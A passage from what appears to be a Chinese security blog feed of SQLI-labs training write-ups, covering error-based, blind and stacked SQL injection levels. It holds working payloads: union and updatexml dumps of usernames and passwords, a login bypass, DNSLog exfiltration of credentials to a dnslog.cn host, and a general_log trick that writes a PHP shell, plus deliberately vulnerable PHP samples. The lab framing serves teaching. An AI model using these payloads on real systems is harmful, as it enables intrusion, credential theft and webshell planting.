class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>k4xoowbia1<span class="hljs-string">&#x27;),0x7e),1)--+ </span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_D5OR) <span class="hljs-keyword">from</span> k4xoowbia1),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span></code></pre><p>这里我注入的表名为：<code>k4xoowbia1</code>，列名为：<code>secret_D5OR</code></p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，对于盲注强烈建议使用脚本，人工太慢，在实战工程中还是靠 sqlmap 这种自动化注入神器或者自己写脚本了，手工注入的话岂不是得天荒地老。</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(($id))</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光的SQLI labs 靶场精简学习记录</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;进阶挑战-54-65-关&quot;&gt;&lt;a href=&quot;#进阶挑战-54-65-关&quot; class=&quot;headerlink&quot; title=&quot;进阶挑战 54-65 关&quot;&gt;&lt;/a&gt;进阶挑战 54-65 关&lt;/h1&gt;&lt;h2 id=&quot;Less-54&quot;&gt;&lt;a href=&quot;#Less-5</summary>
      
    
    
    
    <category term="WEB安全" scheme="http://www.secice.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli lab" scheme="http://www.secice.cn/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场笔记之堆叠注入 38-53 关</title>
    <link href="http://www.secice.cn/p/1f400290"/>
    <id>http://www.secice.cn/p/1f400290</id>
    <published>2020-07-22T12:10:24.000Z</published>
    <updated>2020-12-24T02:16:40.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p><pre><code class="hljs sql">mysql&gt; select * from users where id = 1;select version();+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>|  1 | Dumb     | Dumb     |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)+<span class="hljs-comment">-----------+</span>| <span class="hljs-keyword">version</span>() |+<span class="hljs-comment">-----------+</span>| <span class="hljs-number">8.0</span><span class="hljs-number">.12</span>    |+<span class="hljs-comment">-----------+</span><span class="hljs-number">1</span> <span class="hljs-keyword">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>();</code></pre><p><strong>SQL Server</strong></p><pre><code class="hljs Mssql">select 1,2,3;select * from test;</code></pre><p><strong>Postgresql</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;</code></pre><p>注入天书里面说 Oracle 不支持堆叠查询。</p><h2 id="Less-38-堆叠注入"><a href="#Less-38-堆叠注入" class="headerlink" title="Less-38(堆叠注入)"></a>Less-38(堆叠注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>又到了源码简单分析的时间了，来看看堆叠注入的代码是如何实现的：</p><pre><code class="hljs Php"><span class="hljs-comment"># id 参数直接带入到 SQL 语句中</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>)):    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));</code></pre><p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-variable">$sql</span>);</code></pre><p>变成了现在的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))</code></pre><p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p><p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p><p><strong>添加字段值</strong></p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>);</code></pre><p>数据库中查看是否添加成功：</p><pre><code class="hljs sql">mysql&gt; select * from users where username=&#x27;hello&#x27;;+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>| 15 | hello    | world    |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来演示我认为比较实用的姿势。</p><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>需要条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （<a href="http://dnslog.cn/">dnslog</a>、<a href="http://ceye.io/">CEYE</a>）</li><li>Windows 平台</li></ol><p><code>load_file</code> 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><pre><code class="hljs bash">\\192.168.31.53\<span class="hljs-built_in">test</span>\</code></pre><p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p><p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p><p>下面使用 Windows 下的 sqli-labs 测试环境：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.952nzx.dnslog.cn\\abc&#x27;</span>))<span class="hljs-comment">--+</span></code></pre><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/01.png" alt="Less-38_DNSLog 数据外带"></p><p>手动 Hex 解码即可</p><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>需要条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>首先查看当前的日志的相关配置：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| Variable_name    | Value                                                           |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| general_log      | OFF                                                             || general_log_file | D:\phpstudy_pro\Extensions\MySQL8.0.12\data\DESKTOP-7FQSJGU.log |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p><code>general_log</code>环境默认是没有开启的，这里尝试注入的时候手动开启：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php&#x27;</span>;<span class="hljs-comment">--+</span></code></pre><p>然后 MySQL 再查看日志配置是否被修改了：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| Variable_name    | Value                                         |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| general_log      | ON                                            || general_log_file | D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>这个尝试 getshell：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/02.png" alt="Less-38_开启日志 Getshell"></p><p><code>shell.php</code>日志文件内容：</p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\phpstudy_pro\COM\..\Extensions\MySQL<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>\\bin\mysqld.exe, Version: <span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span> (MySQL Community Server - GPL). started with:<span class="hljs-attribute">TCP</span> Port: <span class="hljs-number">3306</span>, Named Pipe: MySQL<span class="hljs-attribute">Time</span>                 Id Command    Argument<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">42</span>.<span class="hljs-number">153350</span>Z   <span class="hljs-number">10</span> Query-- &#x27; LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267004</span>Z   <span class="hljs-number">11</span> Connectroot@localhost <span class="hljs-literal">on</span> security using TCP/IP<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267240</span>Z   <span class="hljs-number">11</span> Init DBsecurity<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267398</span>Z   <span class="hljs-number">11</span> QuerySELECT * FROM users WHERE id=&#x27;<span class="hljs-number">1</span>&#x27;;<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267695</span>Z   <span class="hljs-number">11</span> Queryselect <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-39/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-38 相比只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1&#x27;);<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-40/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;);<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，这里不再赘述。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><ul><li><code>index.php</code></li></ul><p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p><ul><li><code>forgot_password.php</code></li></ul><p>if you forgot your password,go to hack it</p><ul><li><code>acc-create.php</code></li></ul><p>if you need to create account,then hack your way in</p><ul><li><code>failed.php</code></li></ul><p>Bug off you silly dump hacker</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># username 被过滤 &#x27; &quot; \ password 没有被</span><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<span class="hljs-comment"># 堆叠查询</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<span class="hljs-keyword">if</span> 查询成功：    <span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));<span class="hljs-keyword">if</span> 登录成功:    setcookie(<span class="hljs-string">&quot;Auth&quot;</span>, <span class="hljs-number">1</span>, time()+<span class="hljs-number">3600</span>);    跳转到 logged-in.php</code></pre><ul><li><code>logged-in.php</code></li></ul><p>登录成功，提供修改密码的表单</p><pre><code class="hljs Html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mylogin&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;pass_change.php&quot;</span>&gt;</span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 没有登录:    重定向到 index.php<span class="hljs-keyword">if</span> 提交了修改密码表单:    <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$pass</span>==<span class="hljs-variable">$re_pass</span>:        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;</code></pre><p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p><p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=1&#x27; or 1#&amp;mysubmit=Login</code></pre><p>因为登录成功后返回：</p><pre><code class="hljs Php"><span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];</code></pre><p>所以登录了 id 为 1 的 Dumb 用户：</p><p>尝试<strong>联合查询</strong>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=13141&#x27; union select 1,(select group_concat(username,&quot;:&quot;,password,0x3c62723e) from users),3#&amp;mysubmit=Login</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/03.png" alt="Less-42"></p><p><strong>报错注入</strong>：</p><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(username,&#x27;:&#x27;,password) from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)#&amp;mysubmit=Login</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/04.png" alt="Less-42"></p><p>同理这里也可以进行盲注和堆叠查注入，这里不再赘述。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p><h2 id="Less-46-order-by后的注入"><a href="#Less-46-order-by后的注入" class="headerlink" title="Less-46(order by后的注入)"></a>Less-46(order by后的注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><pre><code class="hljs Php"><span class="hljs-comment"># GET 方式获取 sort 参数</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];<span class="hljs-comment"># 直接将 id 带入 SQL 中</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<span class="hljs-keyword">if</span> 查询成功：    输出查询信息<span class="hljs-keyword">else</span>：    print_r(mysql_error());</code></pre><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p><h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul><li><strong>升序和降序验证</strong></li></ul><pre><code class="hljs Bash"><span class="hljs-comment"># 升序排序</span>?sort=1 asc<span class="hljs-comment"># 降序排序</span>?sort=1 dasc</code></pre><ul><li><strong>rand() 验证</strong></li></ul><p>rand(ture) 和 rand(false) 的结果是不一样的</p><pre><code class="hljs Bash">?sort=rand(<span class="hljs-literal">true</span>)?sort=rand(<span class="hljs-literal">false</span>)</code></pre><p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p><p>此外 rand() 结果是一直都是随机的</p><pre><code class="hljs Bash">?sort=rand()?sort=1 and rand()</code></pre><ul><li><strong>延时验证</strong></li></ul><pre><code class="hljs bash">?sort=sleep(1)?sort=(sleep(1))?sort=1 and sleep(1)</code></pre><p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(schema_name)from information_schema.schemata)),0)</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/05.png" alt="Less-46">可见一次把数据库名爆不完，所以可以采用<code>limit</code>语句控制一次爆库名的个数</p><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select schema_name from information_schema.schemata limit 4,1)),0)</code><br><img 